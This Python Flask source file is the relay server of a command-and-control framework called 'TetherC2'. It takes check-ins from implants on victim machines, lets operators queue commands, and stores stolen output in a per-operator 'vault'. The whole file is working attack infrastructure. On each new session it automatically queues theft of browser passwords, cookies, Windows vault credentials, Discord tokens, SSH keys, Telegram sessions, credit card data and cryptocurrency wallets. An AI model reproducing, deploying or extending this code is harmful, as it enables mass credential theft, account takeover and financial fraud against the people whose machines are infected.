# relay_server.py (Full Code - Corrected for Batched Results)
import sys
import os
import sqlite3
import json
import time
import threading
from flask import Flask, request, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

# Add the project's root directory to the Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from database import DatabaseManager

# --- Configuration & State ---
SESSION_TIMEOUT_SECONDS = 40
app = Flask(__name__)
db = DatabaseManager()

# In-Memory State (with Threading Locks)
command_queue = {}
response_queue = {}
active_sessions = {}
cmd_lock = threading.Lock()
res_lock = threading.Lock()
ses_lock = threading.Lock()

# --- Authentication Endpoints ---
@app.route('/auth/register', methods=['POST'])
def register():
    data = request.json
    username, password = data.get('username'), data.get('password')
    if not all([username, password]) or len(password) < 4:
        return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
    if db.create_user(username, generate_password_hash(password)):
        return jsonify({"success": True, "message": "Account created successfully."})
    else:
        return jsonify({"success": False, "error": "Username already exists."}), 409

@app.route('/auth/login', methods=['POST'])
def login():
    data = request.json
    username, password = data.get('username'), data.get('password')
    user = db.get_user(username)
    if user and check_password_hash(user[1], password):
        return jsonify({"success": True, "username": user[0]})
    else:
        return jsonify({"success": False, "error": "Invalid username or password."}), 401

# --- Implant Endpoints ---
@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json
    session_id, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([session_id, c2_user]): return jsonify({"error": "session_id and c2_user are required"}), 400
    
    with ses_lock:
        is_new_session = session_id not in active_sessions
        metadata = {"hostname": data.get("hostname"), "user": data.get("user"), "os": data.get("os")}
        db.create_or_update_session(session_id, c2_user, metadata)
        active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), **metadata}
        if is_new_session: print(f"[RELAY] New session online from user '{c2_user}': {session_id}")
    
    # --- DEFINITIVE FIX FOR BATCHED RESULTS ---
    # The new implant sends a list of results. Process each one.
    if "results" in data:
        for result in data.get("results", []):
            module_name = result.get("command")
            output_data = result.get("output")
            if module_name and output_data is not None:
                # Save to the persistent database
                db.save_vault_data(session_id, module_name, output_data)
                # Queue for live C2 client pickup
                with res_lock:
                    response_queue.setdefault(c2_user, {}).setdefault(session_id, []).append(result)
    
    with cmd_lock:
        if is_new_session:
            initial_tasks = [
                {"action": "system_info", "params": {}}, {"action": "hardware_info", "params": {}},
                {"action": "security_products", "params": {}}, {"action": "installed_applications", "params": {}},
                {"action": "running_processes", "params": {}}, {"action": "environment_variables", "params": {}},
                {"action": "network_info", "params": {}}, {"action": "wifi_passwords", "params": {}},
                {"action": "active_connections", "params": {}}, {"action": "arp_table", "params": {}},
                {"action": "dns_cache", "params": {}}, {"action": "browser_passwords", "params": {}},
                {"action": "session_cookies", "params": {}}, {"action": "windows_vault_credentials", "params": {}},
                {"action": "application_credentials", "params": {}}, {"action": "discord_tokens", "params": {}},
                {"action": "roblox_cookies", "params": {}}, {"action": "ssh_keys", "params": {}},
                {"action": "telegram_session_files", "params": {}}, {"action": "credit_card_data", "params": {}},
                {"action": "cryptocurrency_wallet_files", "params": {}}, {"action": "browser_autofill", "params": {}},
                {"action": "browser_history", "params": {}}, {"action": "clipboard_contents", "params": {}},
                {"action": "browser_files", "params": {}}
            ]
            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).extend(initial_tasks)
            
        commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
        
    return jsonify({"commands": commands_to_execute})

@app.route('/implant/response', methods=['POST'])
def handle_implant_response():
    data = request.json
    session_id = data.get("session_id")
    if not session_id: return jsonify({"status": "error", "message": "session_id missing"}), 400
    
    owner = active_sessions.get(session_id, {}).get("owner")
    if owner:
        module_name = data.get("command")
        output_data = data.get("output")
        if module_name and output_data is not None:
            db.save_vault_data(session_id, module_name, output_data)
        with res_lock:
            response_queue.setdefault(owner, {}).setdefault(session_id, []).append(data)
            
    return jsonify({"status": "ok"})

# --- C2 Controller Endpoints (Unchanged) ---
@app.route('/c2/task', methods=['POST'])
def handle_c2_task():
    data = request.json; username, session_id, command = data.get("username"), data.get("session_id"), data.get("command")
    if not all([username, session_id, command]): return jsonify({"status": "error", "message": "Missing username, session_id, or command"}), 400
    with cmd_lock: command_queue.setdefault(username, {}).setdefault(session_id, []).append(command)
    return jsonify({"status": "ok"})

@app.route('/c2/discover', methods=['POST'])
def discover_sessions():
    username = request.json.get("username"); user_sessions = {}
    with ses_lock:
        for sid, data in active_sessions.items():
            if data.get("owner") == username and (time.time() - data.get("last_seen", 0)) < SESSION_TIMEOUT_SECONDS:
                user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"], "os": data.get("os", "Unknown")}
    return jsonify({"sessions": user_sessions})
    
@app.route('/c2/get_responses', methods=['POST'])
def get_c2_responses():
    username, session_id = request.json.get("username"), request.json.get("session_id")
    with res_lock: responses = response_queue.get(username, {}).pop(session_id, [])
    return jsonify({"responses": responses})

@app.route('/c2/get_all_vault_data', methods=['POST'])
def get_all_vault_data():
    username = request.json.get("username")
    if not username: return jsonify({"success": False, "error": "Username is required"}), 400
    vault_data = db.load_vault_data_for_user(username)
    return jsonify({"success": True, "data": vault_data})

@app.route('/')
def index(): return "TetherC2 Relay is operational."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print(f"[RELAY] TetherC2 Relay is operational on port {port}.")
    app.run(host='0.0.0.0', port=port)